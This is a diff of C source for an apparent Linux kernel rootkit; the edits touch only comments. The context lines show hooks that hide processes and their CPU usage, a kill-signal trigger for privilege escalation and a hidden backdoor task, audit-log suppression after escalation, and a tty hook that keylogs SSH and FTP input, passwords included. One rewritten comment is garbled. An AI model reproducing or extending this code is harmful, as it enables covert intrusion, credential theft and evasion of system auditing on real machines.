@@ -82,7 +82,7 @@ static asmlinkage long m_exit_group(struct pt_regs *regs)
     } else {
         /**
          * it is regular hidden PID and needs to
-         * be shown prior to exit
+         * be shown before exiting
          */
         kv_hide_task_by_pid(current->pid, 0, NO_CHILDREN);
     }
@@ -133,7 +133,7 @@ m_clone:
 }
 
 /**
- * Handle activate/deactivate /proc/kovid
+ * Handle activate/deactivate /proc/<name>
  * Handle privilege escalation
  */
 static asmlinkage long m_kill(struct pt_regs *regs)
@@ -170,7 +170,6 @@ static asmlinkage long m_kill(struct pt_regs *regs)
 
     /** The 1 next backdoor task will be hidden */
     } else if (171 == pid && SIGCONT == sig) {
-        /** guess am a bit paranoid here... */
         spin_lock(&hide_once_spin);
         hide_once = true;
         spin_unlock(&hide_once_spin);
@@ -292,7 +291,7 @@ static asmlinkage long m_bpf(struct pt_regs *regs) {
     void *key = NULL, *value = NULL;
     unsigned long size = (unsigned int)PT_REGS_PARM3(regs);
 
-    /** Call original straightaway */
+    /** Call original */
     ret = real_m_bpf(regs);
     if (ret < 0) goto out;
 
@@ -369,7 +368,6 @@ static asmlinkage long m_bpf(struct pt_regs *regs) {
                     /**
                      * Send the new empty value back to the userspace.
                      * and pretend map value hasn't spin lock (-EINVAL),
-                     * until I came up with a better idea.
                      */
                     if (!copy_to_user((void*)uvalue, (void*)v, value_size))
                         ret = -EINVAL;
@@ -600,9 +598,9 @@ static int m_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 }
 
 /**
- * Hide CPU usage of any hidden task
- * This is as simple as it looks: simply don't count ticks
- * if they are coming from hidden tasks
+ * Hide CPU usage of any hidden task by
+ * not counting ticks
+ * if they come from hidden tasks
  */
 static void (*real_account_process_tick)(struct task_struct *, int);
 static void m_account_process_tick(struct task_struct *p, int user_tick) {
@@ -628,10 +626,7 @@ static struct audit_buffer *m_audit_log_start(struct audit_context *ctx,
     /**
      *  We'll trigger this KauditD log when executing
      *  certain operations after privilege escalation.
-     *  Legit root may not actually trigger this path
-     *
-     *  Return NULL should be enough to avoid logs, at least
-     *  in most cases. Fingers crossed.
+     *  Legit root may not actually follow this code path
      */
     if (!c->uid.val && !c->gid.val && !c->suid.val &&
             !c->sgid.val && !c->euid.val && !c->egid.val &&
@@ -755,10 +750,6 @@ static int _key_update(uid_t uid, char byte, int flags) {
 }
 
 static void _keylog_cleanup_list(void) {
-    /**
-    * it is unlikely we've left anything
-    * behind, even so...
-    */
     struct keylog_t *node, *node_safe;
     list_for_each_entry_safe(node, node_safe, &keylog_node, list) {
         list_del(&node->list);
@@ -819,7 +810,6 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
         if (!to->iov || !to->iov->iov_base)
             goto out;
 
-        /* read straight from the buffer we want */
         if (copy_from_user(ttybuf, to->iov->iov_base, rv))
             goto out;
 #endif
@@ -841,9 +831,9 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
 
         /**
          * this is hacky but ssh session data
-         * comes bit a bit, while ftp same, however
-         * it can also come in as a batch, for example, when a password
-         * is entered it is buffered internally and sent as a whole at once
+         * comes byte a byte most of the time but can also come in as
+         * multi-byte stream, for example, when a password
+         * it is a password
          */
         if ((app_flag & APP_FTP) && rv > 1) {
             ttybuf[strcspn(ttybuf, "\r")] = '\0';
@@ -874,8 +864,7 @@ static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs
 #endif
 
 /**
- * It's not always that prefix __x64_ is included in
- * syscall names under 64 bits Linux
+ * __x64 prefix is not always present
  */
 static unsigned long  _load_syscall_variant(struct kernel_syscalls *ks,
         const char *str) {
@@ -891,9 +880,7 @@ static unsigned long  _load_syscall_variant(struct kernel_syscalls *ks,
     }
 
     if (!(rv = ks->k_kallsyms_lookup_name(str))) {
-        /** there is no actual limit for syscall
-         * name length, AFAIK, but hey! 64 bytes must fit FFS!
-         */
+        /* there is no actual limit for syscall AFAIK */
         char tmp[64+1] = {0};
 
         snprintf(tmp, 64, "__x64_%s", str);
@@ -1095,7 +1082,7 @@ bool sys_init(void) {
     char *ttyfile = sys_ttyfile();
 
     if (ttyfile) {
-        /** init hooks - negate so we're consistent with other inits */
+        /** XXX: init hooks - negate so we're consistent with other inits */
         rc = !fh_install_hooks(ft_hooks);
         if (rc) {
             for (idx = 0; ft_hooks[idx].name != NULL; ++idx)
